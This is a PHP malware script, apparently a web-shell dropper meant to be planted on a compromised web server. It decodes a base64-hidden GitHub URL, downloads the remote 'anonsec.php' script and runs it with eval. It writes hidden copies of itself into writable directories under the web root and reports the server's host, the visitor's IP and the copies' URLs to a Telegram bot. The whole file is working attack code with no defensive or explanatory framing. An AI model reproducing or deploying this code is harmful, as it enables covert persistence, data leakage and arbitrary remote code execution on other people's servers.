<?php
@ini_set('display_errors', 1);
error_reporting(E_ALL);

function get($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        if ($http_code == 200) {
            curl_setopt($ch, CURLOPT_NOBODY, false);
            curl_setopt($ch, CURLOPT_HEADER, false);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        curl_close($ch);
    }
    return false;
}

function send_telegram($text) {
    $bot_token = 'BOT TOKEN HERE';
    $chat_id = 'CHAT ID HERE';
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $post = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            error_log("Telegram send failed: " . $error);
        } else {
            $res = json_decode($response, true);
            if (!isset($res['ok']) || !$res['ok']) {
                error_log("Telegram API error: " . $response);
            }
        }
    }
}

$x = '?>';
$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hdzNzaXgvbWF3M3NpeC9yZWZzL2hlYWRzL21haW4vYnlwYXNzZWQvYW5vbnNlYy5waHA=');
$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hdzNzaXgvbWF3M3NpeC9yZWZzL2hlYWRzL21haW4vYnlwYXNzZWQvYW5vbnNlYy5waHA=');

$chosen_url = null;
$script = false;

$urls = [$url1, $url2];
shuffle($urls);

foreach ($urls as $url) {
    $result = get($url);
    if ($result !== false) {
        $script = $result;
        $chosen_url = $url;
        break;
    }
}

if (!$chosen_url) {
    http_response_code(200);
    exit;
}

$protocol = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) == 'on') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'] ?? 'unknown';
$port = $_SERVER['SERVER_PORT'];
$port_str = in_array($port, ['80', '443']) ? '' : ":$port";
$base = $protocol . $host . $port_str;

$msg = "```\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "           🚨 GHOST TRIGGERED!           \n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= "```";

$msg .= "\n";
$msg .= "*IP:* `{$_SERVER['REMOTE_ADDR']}`\n";
$msg .= "*Path:* `{$_SERVER['REQUEST_URI']}`\n";
$msg .= "*Host:* `$base`\n";
$msg .= "*Time:* `" . date('Y-m-d H:i:s') . "`\n\n";
$msg .= "👤 *Author:* `@maw3six`\n";

$replica_paths = [];
$doc_root = realpath($_SERVER['DOCUMENT_ROOT'] ?? __DIR__);
$self_code = file_get_contents(__FILE__);
$writable_dirs = [];

$iterator = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($doc_root, FilesystemIterator::SKIP_DOTS),
    RecursiveIteratorIterator::SELF_FIRST
);

foreach ($iterator as $item) {
    if ($item->isDir() && is_writable($item->getPathname()) && !is_link($item->getPathname())) {
        $writable_dirs[] = $item->getPathname();
    }
}

$replica_count = min(3, count($writable_dirs));
if (!empty($writable_dirs)) {
    $selected_dirs = array_intersect_key(
        $writable_dirs,
        array_flip(array_rand($writable_dirs, $replica_count))
    );

    foreach ($selected_dirs as $dir) {
        $random_name = '.' . bin2hex(random_bytes(8)) . '.php';
        $new_path = $dir . '/' . $random_name;
        if (file_put_contents($new_path, $self_code) !== false) {
            @chmod($new_path, 0644);
            $replica_paths[] = $new_path;
        }
    }
}

$base_url = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) == 'on' ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? 'localhost');
$accessible_urls = [];

foreach ($replica_paths as $path) {
    $real_path = realpath($path);
    if ($real_path && strpos($real_path, $doc_root) === 0) {
        $relative = ltrim(str_replace('\\', '/', substr($real_path, strlen($doc_root))), '/');
        $accessible_urls[] = $base_url . '/' . $relative;
    }
}

if (!empty($accessible_urls)) {
    $msg .= "📁 *DEPLOYED (" . count($accessible_urls) . ")*\n";
    $total = count($accessible_urls);
    foreach ($accessible_urls as $i => $url) {
        $prefix = ($i == $total - 1) ? '└─' : '├─';
        $msg .= "$prefix `$url`\n";
    }
} else {
    $msg .= "📁 *DEPLOYED:* `None (no writable dirs or outside web root)`\n";
}

send_telegram($msg);

eval($x . $script);
